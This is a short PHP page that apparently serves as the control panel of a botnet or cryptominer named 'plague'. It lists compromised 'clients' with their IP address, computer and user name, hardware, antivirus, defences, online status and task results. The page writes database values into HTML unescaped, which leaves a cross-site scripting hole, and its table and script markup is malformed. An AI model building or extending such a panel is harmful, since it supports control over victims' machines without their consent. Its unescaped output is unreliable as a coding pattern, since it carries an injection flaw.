<?php

function AddCell($CellContents){
	echo("		<td title=\"$CellContents\">" . $CellContents  . "</td>\r\n");
}

include('data.php');
if(!ConnectDB('plague')){
	die('Failed to connect to the database.');
} else { ?>

<table id="table" style="width: 100%;">
	<tr>
		<th style="width: 56px;">Status</th>
		<th style="width: 46px;">GUID</th>
		<th style="width: 130px;">Nickname</th>
		<th style="width: 120px;">IP Address</th>
		<th style="width: 130px;">Computer</th>
		<th style="width: 240px;">Operating System</th>
		<th style="width: 170px;">CPU</th>
		<th style="width: 160px;">GPU</th>
		<th style="width: 100px;">Antivirus</th>
		<th style="width: 100px;">Defences</th>
		<th style="width: 120px;">Last Seen</th>
		<th style="width: 160px;">Result</th>
	</tr>
<?php
	$Sql = "SELECT * FROM clients;";
	$Result = $Conn->query($Sql);
	if($Result->num_rows > 0){
		while($Row = $Result->fetch_assoc()){
			$LastTime = strtotime($Row['LastSeen']);
			$CurrentTime = strtotime(date("Y-m-d H:i:s"));
			$Diff = round(($CurrentTime - $LastTime) / 60, 2);
			echo("	<tr>\r\n");
			echo("		<td>");
			if($Diff<=5) echo("<div class=\"status online\"></div>"); else echo("<div class=\"status offline\"></div>");
			echo("</td>\r\n");
			AddCell($Row['GUID']);
			AddCell($Row['Nickname']);
			AddCell($Row['IPAddress']);
			AddCell($Row['ComputerName'] . " @ " . $Row['Username']);
			AddCell($Row['OperatingSystem']);
			AddCell($Row['CPU']);
			AddCell($Row['GPU']);
			AddCell($Row['Antivirus']);
			AddCell($Row['Defences']);
			AddCell($Row['LastSeen']);
			AddCell($Row['Result']);
			echo("	<tr>\r\n");
		}
	}
	echo("</table>");
	echo('<script src="scripts\table_copy.js"</script>');
}
?>